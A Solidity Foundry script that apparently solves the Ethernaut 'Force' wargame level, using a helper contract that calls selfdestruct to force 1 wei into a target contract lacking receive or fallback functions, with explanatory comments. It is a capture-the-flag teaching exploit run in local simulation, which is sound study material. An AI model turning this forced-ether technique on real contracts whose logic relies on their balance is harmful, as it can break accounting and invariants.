// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Force} from "../src/Force.sol";

contract ForceSolution is Script {
    // $ forge script script/Force.s.sol --tc ForceSolution

    function run() external {
        Force forceInstance = new Force();

        // --- Attack Starts from Here ---
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        // - The `Force` contract can't receive ETH, since it has no `receive()` nor `fallback()` functions.
        // - However, he can send ETH to a smart contract, even if it doesn't implement receiving ETH functions using `selfdestruct`.
        // - We will deploy a contract and fund it with some ETH (1 wei), then we will call `selfdestruct` to the `Force` address.
        // - The `Force` contract will receive ETH and we will path the challenge.

        ForceAttack attackContract = new ForceAttack{value: 1 wei}(payable(address(forceInstance)));

        console.log("Force balance:", address(forceInstance).balance);
        attackContract.attack();
        console.log("Force balance:", address(forceInstance).balance);
        vm.stopPrank();
    }
}

contract ForceAttack {
    address payable forceInstance;

    constructor(address payable _forceInstance) payable {
        // constructor is payable to send ETH when deploying the contract
        forceInstance = _forceInstance;
    }

    function attack() public {
        selfdestruct(forceInstance);
    }
}
